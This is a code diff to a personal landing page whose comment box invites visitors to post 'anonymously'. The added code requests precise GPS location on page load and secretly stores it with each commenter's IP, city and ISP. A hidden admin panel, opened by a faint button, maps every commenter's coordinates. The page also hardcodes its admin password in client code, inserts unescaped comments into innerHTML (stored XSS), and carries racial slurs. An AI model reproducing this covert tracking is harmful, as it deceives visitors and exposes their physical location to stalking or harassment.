@@ -43,47 +43,54 @@ h1{font-size:clamp(2.5rem,8vw,4rem)}
 }
 
 textarea{
-  width:100%;
-  min-height:90px;
-  background:#000;
+  width:100%;min-height:90px;background:#000;
   border:1px solid rgba(0,255,204,.4);
-  border-radius:12px;
-  padding:12px;
-  color:#fff;
+  border-radius:12px;padding:12px;color:#fff;
 }
 
 .comment-btn{
-  margin-top:10px;
-  padding:10px 18px;
-  background:#00ffcc;
-  color:#000;
-  border:none;
-  border-radius:999px;
-  font-weight:600;
-  cursor:pointer;
+  margin-top:10px;padding:10px 18px;
+  background:#00ffcc;color:#000;border:none;
+  border-radius:999px;font-weight:600;cursor:pointer;
 }
 
 .comment{
-  margin-top:22px; /* ⬅️ MORE SPACE */
-  padding:12px;
-  border-radius:12px;
-  background:rgba(255,255,255,.08);
-  font-size:.95rem;
+  margin-top:22px;padding:12px;border-radius:12px;
+  background:rgba(255,255,255,.08);font-size:.95rem;
 }
 
-.del{
-  float:right;
-  color:#ff6b6b;
-  cursor:pointer;
-}
-
-footer{
-  margin-top:30px;
-  font-size:.9rem;
-  opacity:.6;
-  text-align:center;
-}
+.del{float:right;color:#ff6b6b;cursor:pointer}
+footer{margin-top:30px;font-size:.9rem;opacity:.6;text-align:center}
 small{opacity:.7}
+
+/* 🔐 Admin popup */
+#adminPanel{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.8);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  z-index:999;
+}
+#adminBox{
+  background:#111;
+  width:90%;
+  max-width:700px;
+  max-height:80vh;
+  overflow-y:auto;
+  border-radius:16px;
+  padding:20px;
+}
+iframe{width:100%;height:250px;border-radius:12px;border:none;margin-top:10px}
+
+/* 🕵️ secret button */
+#secretBtn{
+  font-size:10px;
+  opacity:.2;
+  cursor:pointer;
+  margin-top:8px;
+}
 </style>
 </head>
 
@@ -103,7 +110,6 @@ small{opacity:.7}
 
 <div class="card">
   Nigga this my landing page running on my personal server computer 24/7.
-  U finding urself hard? come over nigga lets do a fight on.
   <br><br>
   <a href="https://naturally-partial-wrote-scout.trycloudflare.com/a80cccda/instagram" target="_blank">
     https://naturally-partial-wrote-scout.trycloudflare.com/a80cccda/instagram
@@ -116,9 +122,19 @@ small{opacity:.7}
   <textarea id="commentInput" placeholder="Please comment anonymously"></textarea>
   <button class="comment-btn" onclick="addComment()">Post</button>
   <div id="comments"></div>
+  <div id="secretBtn" onclick="openAdmin()">•</div>
 </div>
 
 <footer>© 2026 Akshat Pandey • Hosted on my infrastructure</footer>
+</div>
+
+<!-- 🔐 ADMIN PANEL -->
+<div id="adminPanel">
+  <div id="adminBox">
+    <h3>Admin Location Panel</h3>
+    <div id="adminContent"></div>
+    <button class="comment-btn" onclick="closeAdmin()">Close</button>
+  </div>
 </div>
 
 <script type="module">
@@ -129,7 +145,7 @@ import {
   serverTimestamp, deleteDoc, doc
 } from "https://www.gstatic.com/firebasejs/12.8.0/firebase-firestore.js";
 
-const ADMIN_KEY = "@Akshat130807"; // 🔐 UPDATED ADMIN KEY
+const ADMIN_KEY = "@Akshat130807";
 
 const firebaseConfig = {
   apiKey: "AIzaSyCY88mD-sHqxZiOGkQZbliTXG1QmySPesI",
@@ -140,8 +156,27 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-const commentsDiv = document.getElementById("comments");
-const input = document.getElementById("commentInput");
+let gps = null;
+
+/* 📍 AUTO ASK GPS ON LOAD */
+window.onload = () => {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => gps = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: pos.coords.accuracy
+      },
+      () => gps = null,
+      { enableHighAccuracy: true }
+    );
+  }
+};
+
+async function getIP(){
+  const r = await fetch("https://ipapi.co/json/");
+  return r.json();
+}
 
 function flag(code){
   return code.toUpperCase().replace(/./g,c =>
@@ -149,57 +184,73 @@ function flag(code){
   );
 }
 
-async function getIPData(){
-  const res = await fetch("https://ipapi.co/json/");
-  return res.json();
-}
-
 window.addComment = async () => {
-  if(!input.value.trim()) return;
+  const text = commentInput.value.trim();
+  if(!text) return;
 
-  const ip = await getIPData();
+  const ip = await getIP();
 
   await addDoc(collection(db,"comments"),{
-    msg: input.value,
-    ip: ip.ip,
-    city: ip.city,
-    region: ip.region,
-    country: ip.country,
-    flag: flag(ip.country),
-    timezone: ip.timezone,
-    org: ip.org,
-    time: serverTimestamp()
+    msg:text,
+    ip:ip.ip,
+    city:ip.city,
+    region:ip.region,
+    country:ip.country,
+    flag:flag(ip.country),
+    timezone:ip.timezone,
+    org:ip.org,
+    gps:gps,
+    time:serverTimestamp()
   });
 
-  input.value = "";
+  commentInput.value="";
 };
 
 const q = query(collection(db,"comments"), orderBy("time","desc"));
-onSnapshot(q, snap => {
-  commentsDiv.innerHTML = "";
-  snap.forEach(d => {
-    const c = d.data();
-    const t = c.time ? new Date(c.time.seconds*1000).toLocaleString() : "";
-
-    commentsDiv.innerHTML += `
-      <div class="comment">
-        <span class="del" onclick="delComment('${d.id}')">✖</span>
-        <b>${c.flag} ${c.city}, ${c.region}</b><br>
-        <small>IP: ${c.ip} • ${c.timezone}</small><br>
-        <small>${c.org}</small><br>
-        <small>${t}</small><br><br>
-        ${c.msg}
-      </div>
-    `;
+onSnapshot(q,snap=>{
+  comments.innerHTML="";
+  snap.forEach(d=>{
+    const c=d.data();
+    const t=c.time?new Date(c.time.seconds*1000).toLocaleString():"";
+    comments.innerHTML+=`
+    <div class="comment">
+      <span class="del" onclick="delComment('${d.id}')">✖</span>
+      <b>${c.flag} ${c.city}</b><br>
+      <small>${t}</small><br>
+      ${c.msg}
+    </div>`;
   });
 });
 
-window.delComment = async (id) => {
-  const key = prompt("Admin key:");
-  if(key !== ADMIN_KEY) return alert("Unauthorized");
+/* ❌ delete */
+window.delComment=async(id)=>{
+  const k=prompt("Admin key:");
+  if(k!==ADMIN_KEY) return;
   await deleteDoc(doc(db,"comments",id));
 };
-</script>
 
+/* 🔐 admin panel */
+window.openAdmin=()=>{
+  const k=prompt("Admin key:");
+  if(k!==ADMIN_KEY) return;
+  adminPanel.style.display="flex";
+};
+
+window.closeAdmin=()=>adminPanel.style.display="none";
+
+onSnapshot(q,snap=>{
+  adminContent.innerHTML="";
+  snap.forEach(d=>{
+    const c=d.data();
+    if(!c.gps) return;
+    adminContent.innerHTML+=`
+    <div class="comment">
+      <b>${c.city}</b><br>
+      GPS: ${c.gps.lat}, ${c.gps.lon} (±${Math.round(c.gps.acc)}m)
+      <iframe src="https://www.openstreetmap.org/export/embed.html?bbox=${c.gps.lon-0.01},${c.gps.lat-0.01},${c.gps.lon+0.01},${c.gps.lat+0.01}&marker=${c.gps.lat},${c.gps.lon}"></iframe>
+    </div>`;
+  });
+});
+</script>
 </body>
 </html>
